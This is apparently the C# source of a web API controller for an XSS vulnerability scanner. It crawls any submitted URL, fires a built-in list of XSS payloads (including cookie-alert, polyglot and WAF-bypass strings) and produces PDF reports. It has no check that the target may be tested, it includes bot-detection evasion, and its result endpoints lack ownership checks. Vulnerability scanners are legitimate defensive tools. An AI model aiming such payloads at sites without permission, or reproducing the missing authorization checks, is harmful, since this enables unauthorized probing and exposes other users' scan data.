using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.Security.Claims;
using Api.Models;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using Microsoft.Extensions.Logging;
using Polly;
using Polly.Retry;
using iTextSharp.text;
using iTextSharp.text.pdf;

namespace Api.Controllers
{
    [Authorize(Roles = "User")]
    [Route("api/xss-scan")]
    [ApiController]
    public class XSSScanController : ControllerBase
    {
        private readonly ApiContext _context;
        private readonly IHttpClientFactory _httpClientFactory;
        private readonly ILogger<XSSScanController> _logger;
        private readonly AsyncRetryPolicy _dbRetryPolicy;

        public XSSScanController(
            ApiContext context,
            IHttpClientFactory httpClientFactory,
            ILogger<XSSScanController> logger)
        {
            _context = context;
            _httpClientFactory = httpClientFactory;
            _logger = logger;

            // Define retry policy for database operations
            _dbRetryPolicy = Policy
                .Handle<MySqlConnector.MySqlException>()
                .Or<Microsoft.EntityFrameworkCore.DbUpdateException>()
                .WaitAndRetryAsync(3, retryAttempt => TimeSpan.FromSeconds(Math.Pow(2, retryAttempt)),
                    (exception, timeSpan, retryCount, context) =>
                    {
                        _logger.LogWarning($"Database retry {retryCount} after {timeSpan.TotalSeconds}s due to: {exception.Message}");
                    });
        }

        // XSS Payload Repository
        private static readonly List<XSSPayload> _xssPayloads = new()
        {
            new XSSPayload { Type = "Reflected", Payload = "<script>alert(1)</script>", Description = "Basic script tag injection" },
            new XSSPayload { Type = "Reflected", Payload = "<script>alert(document.cookie)</script>", Description = "Cookie stealing payload" },
            new XSSPayload { Type = "Reflected", Payload = "\" onmouseover=\"alert(1)", Description = "HTML attribute injection" },
            new XSSPayload { Type = "Reflected", Payload = "'><img src=x onerror=alert(1)>", Description = "Tag break with event handler" },
            new XSSPayload { Type = "Stored", Payload = "<img src=x onerror=alert(document.cookie)>", Description = "Image tag with error handler" },
            new XSSPayload { Type = "Stored", Payload = "<svg onload=alert(1)>", Description = "SVG tag with load handler" },
            new XSSPayload { Type = "DOM", Payload = "#javascript:alert(1)", Description = "URL fragment injection" },
            new XSSPayload { Type = "DOM", Payload = "?param=</script><script>alert(1)</script>", Description = "DOM break out" },
            new XSSPayload { Type = "Polyglot", Payload = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e", Description = "Advanced polyglot payload" },
            new XSSPayload { Type = "WAFBypass", Payload = "<scr<script>ipt>alert(1)</scr</script>ipt>", Description = "Nested script tags to bypass WAF" },
            new XSSPayload { Type = "WAFBypass", Payload = "<img src=\"x\" onerror=\"alert(1)\">", Description = "Mixed case and quotes" },
            new XSSPayload { Type = "WAFBypass", Payload = "%3Cscript%3Ealert(1)%3C/script%3E", Description = "URL encoded payload" }
        };

        [HttpPost("scan")]
        public async Task<IActionResult> StartXSSScan([FromBody] XSSScanRequest request, CancellationToken cancellationToken)
        {
            if (!ModelState.IsValid || string.IsNullOrEmpty(request.Url))
                return BadRequest("Invalid request: URL is required");

            var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
            if (string.IsNullOrEmpty(userId))
                return Unauthorized();

            // Create website record if not exists
            var website = await _context.Websites
                .FirstOrDefaultAsync(w => w.Url == request.Url, cancellationToken);

            if (website == null)
            {
                website = new Website
                {
                    Url = request.Url,
                    UserId = userId,
                    CreatedAt = DateTime.UtcNow
                };
                _context.Websites.Add(website);
                await _dbRetryPolicy.ExecuteAsync(() => _context.SaveChangesAsync(cancellationToken));
            }

            // Create scan request
            var scanRequest = new ScanRequest
            {
                UserId = userId,
                WebsiteId = website.WebsiteId,
                Status = "In Progress",
                StartedAt = DateTime.UtcNow
            };
            _context.ScanRequests.Add(scanRequest);
            await _dbRetryPolicy.ExecuteAsync(() => _context.SaveChangesAsync(cancellationToken));

            try
            {
                // Set global timeout for the entire scan (5 minutes)
                using var cts = new CancellationTokenSource(TimeSpan.FromMinutes(5));
                using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(cts.Token, cancellationToken);

                var results = await PerformXSSScan(request.Url, request.DeepScan, linkedCts.Token);

                // Save results
                var scanResults = results.Select(r => new ScanResult
                {
                    RequestId = scanRequest.RequestId,
                    VulnerabilityId = r.VulnerabilityId,
                    Severity = r.Severity,
                    Details = r.Details,
                    Summary = r.Summary,
                    PayloadUsed = r.Payload,
                    VulnerabilityType = r.Type
                }).ToList();

                await _dbRetryPolicy.ExecuteAsync(async () =>
                {
                    await _context.ScanResults.AddRangeAsync(scanResults, linkedCts.Token);
                    scanRequest.Status = "Completed";
                    scanRequest.CompletedAt = DateTime.UtcNow;
                    await _context.SaveChangesAsync(linkedCts.Token);
                });

                return Ok(new
                {
                    Message = "XSS scan completed",
                    Results = scanResults,
                    RedirectUrl = $"/scan-results/{scanRequest.RequestId}"
                });
            }
            catch (OperationCanceledException ex)
            {
                _logger.LogWarning(ex, "XSS scan was canceled");
                scanRequest.Status = "Canceled";
                await _dbRetryPolicy.ExecuteAsync(() => _context.SaveChangesAsync(CancellationToken.None));
                return StatusCode(499, "XSS scan was canceled");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "XSS scan failed");
                scanRequest.Status = "Failed";
                await _dbRetryPolicy.ExecuteAsync(() => _context.SaveChangesAsync(CancellationToken.None));
                return StatusCode(500, "XSS scan failed");
            }
        }

        private async Task<List<XSSScanResult>> PerformXSSScan(string url, bool deepScan, CancellationToken cancellationToken)
        {
            var results = new ConcurrentBag<XSSScanResult>();
            var httpClient = _httpClientFactory.CreateClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            httpClient.Timeout = TimeSpan.FromSeconds(30); // Increased timeout

            // Crawl the website to find all input points
            var inputPoints = await CrawlWebsite(url, httpClient, deepScan, cancellationToken);

            // Test input points concurrently
            var tasks = inputPoints.Select(inputPoint => Task.Run(async () =>
            {
                foreach (var payload in _xssPayloads)
                {
                    try
                    {
                        var (isVulnerable, response) = await TestInputPointForXSS(
                            inputPoint,
                            payload,
                            httpClient,
                            cancellationToken);

                        if (isVulnerable)
                        {
                            results.Add(new XSSScanResult
                            {
                                Type = payload.Type,
                                Payload = payload.Payload,
                                Url = inputPoint.Url,
                                Severity = GetSeverityForXSS(payload.Type),
                                Details = $"{payload.Type} XSS vulnerability found in {inputPoint.Url} with payload: {payload.Payload}. " +
                                          $"Response contained reflected payload: {Truncate(response, 200)}",
                                Summary = $"{payload.Type} XSS detected in {GetEndpointName(inputPoint.Url)}",
                                VulnerabilityId = GetVulnerabilityId(payload.Type)
                            });
                        }
                        // Add delay to avoid triggering bot protection
                        await Task.Delay(100, cancellationToken);
                    }
                    catch (TaskCanceledException ex)
                    {
                        _logger.LogWarning(ex, $"Request canceled while testing {inputPoint.Url} with payload {payload.Payload}");
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError(ex, $"Error testing {inputPoint.Url} with payload {payload.Payload}");
                    }
                }
            }, cancellationToken)).ToList();

            await Task.WhenAll(tasks);

            return results.ToList();
        }

        private async Task<List<InputPoint>> CrawlWebsite(string baseUrl, HttpClient httpClient, bool deepScan, CancellationToken cancellationToken)
        {
            var inputPoints = new ConcurrentBag<InputPoint>();
            var visitedUrls = new ConcurrentDictionary<string, bool>();
            var urlsToVisit = new ConcurrentQueue<string>();
            urlsToVisit.Enqueue(baseUrl);
            var baseUri = new Uri(baseUrl);
            int maxDepth = deepScan ? 3 : 1;
            int currentDepth = 0;
            int maxConcurrentRequests = 3; // Reduced concurrency
            var semaphore = new SemaphoreSlim(maxConcurrentRequests);

            var commonParams = new[] { "query", "search", "q", "input", "text", "comment", "message" };

            while (urlsToVisit.TryDequeue(out var currentUrl) && currentDepth <= maxDepth)
            {
                if (visitedUrls.ContainsKey(currentUrl))
                    continue;

                await semaphore.WaitAsync(cancellationToken);
                try
                {
                    if (!visitedUrls.TryAdd(currentUrl, true))
                        continue;

                    _logger.LogDebug($"Crawling URL: {currentUrl}");
                    var response = await httpClient.GetAsync(currentUrl, cancellationToken);
                    if (response.IsSuccessStatusCode)
                    {
                        var content = await response.Content.ReadAsStringAsync(cancellationToken);

                        // Add the URL as an input point with common parameters
                        var parameters = ExtractQueryParameters(currentUrl);
                        if (!parameters.Any())
                        {
                            parameters = commonParams.ToDictionary(p => p, p => "");
                        }
                        inputPoints.Add(new InputPoint { Url = currentUrl, Type = "GET", Parameters = parameters });

                        // Extract forms and their input fields
                        var forms = ExtractForms(content, currentUrl);
                        foreach (var form in forms)
                            inputPoints.Add(form);

                        // Extract links for crawling
                        if (deepScan || currentDepth < maxDepth)
                        {
                            var links = ExtractLinks(content);
                            foreach (var link in links)
                            {
                                var absoluteUrl = MakeAbsoluteUrl(baseUrl, link);
                                if (absoluteUrl != null &&
                                    !visitedUrls.ContainsKey(absoluteUrl) &&
                                    IsSameDomain(baseUri, new Uri(absoluteUrl)))
                                {
                                    urlsToVisit.Enqueue(absoluteUrl);
                                    inputPoints.Add(new InputPoint
                                    {
                                        Url = absoluteUrl,
                                        Type = "GET",
                                        Parameters = ExtractQueryParameters(absoluteUrl).Any()
                                            ? ExtractQueryParameters(absoluteUrl)
                                            : commonParams.ToDictionary(p => p, p => "")
                                    });
                                }
                            }
                        }
                    }
                    currentDepth++;
                    await Task.Delay(100, cancellationToken); // Delay to avoid bot detection
                }
                catch (TaskCanceledException ex)
                {
                    _logger.LogWarning(ex, $"Request canceled while crawling {currentUrl}");
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, $"Error crawling {currentUrl}");
                }
                finally
                {
                    semaphore.Release();
                }
            }

            // Add POST input points for base URL with common parameters if no forms are found
            if (!inputPoints.Any(ip => ip.Type == "POST"))
            {
                inputPoints.Add(new InputPoint
                {
                    Url = baseUrl,
                    Type = "POST",
                    Parameters = commonParams.ToDictionary(p => p, p => "")
                });
            }

            return inputPoints.DistinctBy(ip => ip.Url + ip.Type).ToList();
        }

        private async Task<(bool isVulnerable, string response)> TestInputPointForXSS(
            InputPoint inputPoint,
            XSSPayload payload,
            HttpClient httpClient,
            CancellationToken cancellationToken)
        {
            string responseContent = null;

            // Test GET parameters
            if (inputPoint.Type == "GET")
            {
                foreach (var param in inputPoint.Parameters.Keys)
                {
                    var modifiedUrl = InjectPayloadIntoUrl(inputPoint.Url, param, payload.Payload);
                    try
                    {
                        _logger.LogDebug($"Testing GET: {modifiedUrl}");
                        var response = await httpClient.GetAsync(modifiedUrl, cancellationToken);
                        responseContent = await response.Content.ReadAsStringAsync(cancellationToken);

                        if (IsPayloadReflected(responseContent, payload.Payload))
                            return (true, responseContent);
                    }
                    catch (TaskCanceledException ex)
                    {
                        _logger.LogWarning(ex, $"Request canceled for GET {modifiedUrl}");
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError(ex, $"Error testing GET {modifiedUrl}");
                    }
                }
            }

            // Test POST parameters
            if (inputPoint.Type == "POST")
            {
                try
                {
                    var formData = new Dictionary<string, string>();
                    foreach (var param in inputPoint.Parameters.Keys)
                    {
                        formData[param] = payload.Payload;
                    }

                    _logger.LogDebug($"Testing POST: {inputPoint.Url}");
                    var content = new FormUrlEncodedContent(formData);
                    var response = await httpClient.PostAsync(inputPoint.Url, content, cancellationToken);
                    responseContent = await response.Content.ReadAsStringAsync(cancellationToken);

                    if (IsPayloadReflected(responseContent, payload.Payload))
                        return (true, responseContent);
                }
                catch (TaskCanceledException ex)
                {
                    _logger.LogWarning(ex, $"Request canceled for POST to {inputPoint.Url}");
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, $"Error testing POST to {inputPoint.Url}");
                }
            }

            // Test URL path injection
            try
            {
                var uri = new Uri(inputPoint.Url);
                var pathInjectedUrl = $"{uri.GetLeftPart(UriPartial.Path)}/{Uri.EscapeDataString(payload.Payload)}{(uri.Query.Length > 0 ? uri.Query : "")}";
                _logger.LogDebug($"Testing path injection: {pathInjectedUrl}");
                var response = await httpClient.GetAsync(pathInjectedUrl, cancellationToken);
                responseContent = await response.Content.ReadAsStringAsync(cancellationToken);

                if (IsPayloadReflected(responseContent, payload.Payload))
                    return (true, responseContent);
            }
            catch (TaskCanceledException ex)
            {
                _logger.LogWarning(ex, $"Request canceled for path injection on {inputPoint.Url}");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Error testing path injection on {inputPoint.Url}");
            }

            // Test appending common query parameters if none exist
            if (!inputPoint.Url.Contains("?") && inputPoint.Type == "GET")
            {
                foreach (var param in new[] { "query", "q", "search" })
                {
                    var modifiedUrl = $"{inputPoint.Url}{(inputPoint.Url.Contains("?") ? "&" : "?")}{param}={Uri.EscapeDataString(payload.Payload)}";
                    try
                    {
                        _logger.LogDebug($"Testing appended param: {modifiedUrl}");
                        var response = await httpClient.GetAsync(modifiedUrl, cancellationToken);
                        responseContent = await response.Content.ReadAsStringAsync(cancellationToken);

                        if (IsPayloadReflected(responseContent, payload.Payload))
                            return (true, responseContent);
                    }
                    catch (TaskCanceledException ex)
                    {
                        _logger.LogWarning(ex, $"Request canceled for appended param {modifiedUrl}");
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError(ex, $"Error testing appended param {modifiedUrl}");
                    }
                }
            }

            return (false, responseContent);
        }

        private bool IsPayloadReflected(string content, string payload)
        {
            if (string.IsNullOrEmpty(content))
                return false;

            // Check for WAF/bot protection pages
            if (content.Contains("Just a moment...") || 
                content.Contains("Cloudflare") || 
                content.Contains("Access denied") ||
                content.Contains("403 Forbidden"))
            {
                _logger.LogDebug("WAF or bot protection detected, skipping payload reflection check");
                return false;
            }

            // Normalize content and payload for case-insensitive comparison
            var normalizedContent = content.ToLowerInvariant();
            var normalizedPayload = payload.ToLowerInvariant();

            // Check for exact match in dangerous contexts
            var dangerousPatterns = new[]
            {
                $"<script[^>]*>.*?{Regex.Escape(normalizedPayload)}.*?</script>",
                $"<[^>]+on\\w+\\s*=\\s*['\"]?{Regex.Escape(normalizedPayload)}['\"]?",
                $"<[^>]+href\\s*=\\s*['\"]javascript:.*?{Regex.Escape(normalizedPayload)}.*['\"]"
            };

            foreach (var pattern in dangerousPatterns)
            {
                if (Regex.IsMatch(normalizedContent, pattern, RegexOptions.IgnoreCase))
                    return true;
            }

            // Check if payload is unencoded
            var encodedPayload = HttpUtility.HtmlEncode(payload).ToLowerInvariant();
            if (normalizedContent.Contains(normalizedPayload) && !normalizedContent.Contains(encodedPayload))
                return true;

            // Check for URL-encoded payload
            var urlEncodedPayload = Uri.EscapeDataString(payload).ToLowerInvariant();
            if (normalizedContent.Contains(urlEncodedPayload))
                return true;

            return false;
        }

        private string InjectPayloadIntoUrl(string url, string paramName, string payload)
        {
            var uriBuilder = new UriBuilder(url);
            var query = HttpUtility.ParseQueryString(uriBuilder.Query);
            query[paramName] = payload;
            uriBuilder.Query = query.ToString();
            return uriBuilder.ToString();
        }

        private List<string> ExtractLinks(string html)
        {
            var links = new List<string>();
            var hrefMatches = Regex.Matches(
                html,
                @"href\s*=\s*[""']([^""']*)[""']",
                RegexOptions.IgnoreCase);

            foreach (Match match in hrefMatches)
            {
                if (match.Groups.Count > 1)
                    links.Add(match.Groups[1].Value);
            }

            var srcMatches = Regex.Matches(
                html,
                @"src\s*=\s*[""']([^""']*)[""']",
                RegexOptions.IgnoreCase);

            foreach (Match match in srcMatches)
            {
                if (match.Groups.Count > 1)
                    links.Add(match.Groups[1].Value);
            }

            return links;
        }

        private List<InputPoint> ExtractForms(string html, string baseUrl)
        {
            var forms = new List<InputPoint>();
            var formMatches = Regex.Matches(
                html,
                @"<form\s+[^>]*action\s*=\s*[""']([^""']*)[""'][^>]*>(.*?)</form>",
                RegexOptions.IgnoreCase | RegexOptions.Singleline);

            foreach (Match match in formMatches)
            {
                if (match.Groups.Count < 2)
                    continue;

                var action = match.Groups[1].Value;
                var formContent = match.Groups[2].Value;
                var absoluteAction = MakeAbsoluteUrl(baseUrl, action) ?? baseUrl;

                var parameters = new Dictionary<string, string>();
                var inputMatches = Regex.Matches(
                    formContent,
                    @"<input\s+[^>]*name\s*=\s*[""']([^""']*)[""'][^>]*>",
                    RegexOptions.IgnoreCase);

                foreach (Match input in inputMatches)
                {
                    if (input.Groups.Count > 1)
                        parameters[input.Groups[1].Value] = "";
                }

                if (parameters.Any())
                {
                    forms.Add(new InputPoint
                    {
                        Url = absoluteAction,
                        Type = "POST",
                        Parameters = parameters
                    });
                }
                else
                {
                    forms.Add(new InputPoint
                    {
                        Url = absoluteAction,
                        Type = "POST",
                        Parameters = new Dictionary<string, string>
                        {
                            { "query", "" },
                            { "search", "" },
                            { "q", "" }
                        }
                    });
                }
            }

            return forms;
        }

        private Dictionary<string, string> ExtractQueryParameters(string url)
        {
            var parameters = new Dictionary<string, string>();
            try
            {
                var uri = new Uri(url);
                var query = HttpUtility.ParseQueryString(uri.Query);
                foreach (var key in query.AllKeys.Where(k => !string.IsNullOrEmpty(k)))
                {
                    parameters[key] = "";
                }
            }
            catch
            {
                // Ignore malformed URLs
            }
            return parameters;
        }

        private string MakeAbsoluteUrl(string baseUrl, string relativeUrl)
        {
            try
            {
                if (Uri.IsWellFormedUriString(relativeUrl, UriKind.Absolute))
                    return relativeUrl;

                if (relativeUrl.StartsWith("javascript:", StringComparison.OrdinalIgnoreCase) ||
                    relativeUrl.StartsWith("mailto:", StringComparison.OrdinalIgnoreCase))
                    return null;

                var baseUri = new Uri(baseUrl);
                return new Uri(baseUri, relativeUrl).ToString();
            }
            catch
            {
                return null;
            }
        }

        private bool IsSameDomain(Uri baseUri, Uri targetUri)
        {
            return baseUri.Host.Equals(targetUri.Host, StringComparison.OrdinalIgnoreCase);
        }

        private string GetSeverityForXSS(string xssType)
        {
            return xssType switch
            {
                "Stored" => "High",
                "Polyglot" => "High",
                "WAFBypass" => "High",
                _ => "Medium"
            };
        }

        private int? GetVulnerabilityId(string xssType)
        {
            return xssType switch
            {
                "Reflected" => 1,
                "Stored" => 2,
                "DOM" => 3,
                "Polyglot" => 4,
                "WAFBypass" => 5,
                _ => null
            };
        }

        private string GetEndpointName(string url)
        {
            try
            {
                var uri = new Uri(url);
                return uri.PathAndQuery;
            }
            catch
            {
                return url;
            }
        }

        private string Truncate(string value, int maxLength)
        {
            if (string.IsNullOrEmpty(value)) return value;
            return value.Length <= maxLength ? value : value.Substring(0, maxLength) + "...";
        }

        [HttpGet("results/{requestId}")]
        public async Task<IActionResult> GetXSSScanResults(int requestId, CancellationToken cancellationToken)
        {
            var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
            if (string.IsNullOrEmpty(userId))
                return Unauthorized();

            var results = await _context.ScanResults
                .Where(r => r.RequestId == requestId)
                .Include(r => r.Vulnerability)
                .Select(r => new
                {
                    r.ResultId,
                    r.Severity,
                    r.Details,
                    r.Summary,
                    r.PayloadUsed,
                    r.VulnerabilityType,
                    Vulnerability = r.Vulnerability != null ? r.Vulnerability.VulnerabilityName : null
                })
                .ToListAsync(cancellationToken);

            return Ok(results);
        }

 [HttpGet("report/{requestId}")]
public async Task<IActionResult> GenerateXSSReport(int requestId, CancellationToken cancellationToken)
{
    var results = await _context.ScanResults
        .Where(r => r.RequestId == requestId)
        .Include(r => r.Vulnerability)
        .Include(r => r.ScanRequest)
        .ThenInclude(sr => sr.Website)
        .ToListAsync(cancellationToken);

    if (!results.Any())
        return NotFound("No results found");

    using (var memoryStream = new MemoryStream())
    {
        Document document = new Document(PageSize.A4, 40, 40, 60, 40);
        PdfWriter writer = PdfWriter.GetInstance(document, memoryStream);
        document.Open();

        // Define fonts and colors
        Font titleFont = FontFactory.GetFont(FontFactory.HELVETICA_BOLD, 16, new BaseColor(33, 37, 41)); // Dark gray
        Font sectionFont = FontFactory.GetFont(FontFactory.HELVETICA_BOLD, 12, new BaseColor(52, 58, 64)); // Darker gray
        Font bodyFont = FontFactory.GetFont(FontFactory.HELVETICA, 10, new BaseColor(73, 80, 87)); // Medium gray
        BaseColor accentColor = new BaseColor(108, 117, 125); // Blue-gray for borders
        BaseColor lowSeverity = new BaseColor(111, 207, 151); // Green for low severity
        BaseColor mediumSeverity = new BaseColor(255, 193, 7); // Amber for medium severity
        BaseColor highSeverity = new BaseColor(220, 53, 69); // Red for high severity
        BaseColor cardBackground = new BaseColor(248, 249, 250); // Light gray background

        // Add title
        Paragraph title = new Paragraph("Cross-Site Scripting (XSS) Scan Report", titleFont);
        title.Alignment = Element.ALIGN_CENTER;
        title.SpacingAfter = 20;
        document.Add(title);

        // Add summary section
        PdfPTable summaryTable = new PdfPTable(1);
        summaryTable.WidthPercentage = 100;
        PdfPCell summaryCell = new PdfPCell();
        summaryCell.BorderColor = accentColor;
        summaryCell.BorderWidth = 1;
        summaryCell.BackgroundColor = cardBackground;
        summaryCell.Padding = 10;

        Paragraph summary = new Paragraph();
        summary.Add(new Chunk("Scan Summary\n", sectionFont));
        summary.Add(new Phrase($"Website: {results.First().ScanRequest.Website.Url}\n", bodyFont));
        summary.Add(new Phrase($"Scan Date: {results.First().ScanRequest.StartedAt:yyyy-MM-dd HH:mm}\n", bodyFont));
        summary.Add(new Phrase($"Total Vulnerabilities Found: {results.Count}\n", bodyFont));
        summaryCell.AddElement(summary);
        summaryTable.AddCell(summaryCell);
        document.Add(summaryTable);

        document.Add(new Paragraph(" ", bodyFont));

        // Add findings section
        Paragraph findingsTitle = new Paragraph("Vulnerability Findings", sectionFont);
        findingsTitle.SpacingBefore = 10;
        findingsTitle.SpacingAfter = 10;
        document.Add(findingsTitle);

        foreach (var result in results)
        {
            // Create a card-like container for each finding
            PdfPTable cardTable = new PdfPTable(1);
            cardTable.WidthPercentage = 100;
            PdfPCell cardCell = new PdfPCell();
            cardCell.BorderColor = accentColor;
            cardCell.BorderWidth = 1;
            cardCell.BackgroundColor = cardBackground;
            cardCell.Padding = 12;

            // Severity indicator
            BaseColor severityColor = result.Severity == "High" ? highSeverity :
                                    result.Severity == "Medium" ? mediumSeverity : lowSeverity;
            PdfPTable severityBar = new PdfPTable(1);
            severityBar.WidthPercentage = 100;
            PdfPCell severityCell = new PdfPCell(new Phrase(" ", bodyFont));
            severityCell.BackgroundColor = severityColor;
            severityCell.FixedHeight = 4;
            severityCell.Border = 0;
            severityBar.AddCell(severityCell);
            cardCell.AddElement(severityBar);

            // Finding details
            Paragraph finding = new Paragraph();
            finding.SpacingBefore = 8;
            finding.Add(new Chunk($"Vulnerability Type: ", sectionFont));
            finding.Add(new Phrase($"{result.VulnerabilityType ?? "Unknown"}\n", bodyFont));
            
            finding.Add(new Chunk($"Severity: ", sectionFont));
            finding.Add(new Phrase($"{result.Severity ?? "Unknown"}\n", bodyFont));
            
            finding.Add(new Chunk($"Payload: ", sectionFont));
            finding.Add(new Phrase($"{result.PayloadUsed ?? "None"}\n", bodyFont));
            
            finding.Add(new Chunk($"Details: ", sectionFont));
            finding.Add(new Phrase($"{result.Details ?? "No details available"}\n", bodyFont));
            
            finding.Add(new Chunk($"Remediation: ", sectionFont));
            finding.Add(new Phrase($"{result.Vulnerability?.Remediation ?? "No remediation provided"}", bodyFont));
            
            cardCell.AddElement(finding);
            cardTable.AddCell(cardCell);
            document.Add(cardTable);
            
            document.Add(new Paragraph(" ", bodyFont));
        }

        document.Close();
        byte[] pdfBytes = memoryStream.ToArray();
        return File(pdfBytes, "application/pdf", $"xss-report-{requestId}.pdf");
    }
}
    }

    public class XSSScanRequest
    {
        public string Url { get; set; }
        public bool DeepScan { get; set; } = false;
    }

    public class XSSPayload
    {
        public string Type { get; set; }
        public string Payload { get; set; }
        public string Description { get; set; }
    }

    public class XSSScanResult
    {
        public string Type { get; set; }
        public string Payload { get; set; }
        public string Url { get; set; }
        public string Severity { get; set; }
        public string Details { get; set; }
        public string Summary { get; set; }
        public int? VulnerabilityId { get; set; }
    }

    public class InputPoint
    {
        public string Url { get; set; }
        public string Type { get; set; } // GET or POST
        public Dictionary<string, string> Parameters { get; set; } = new Dictionary<string, string>();
    }
}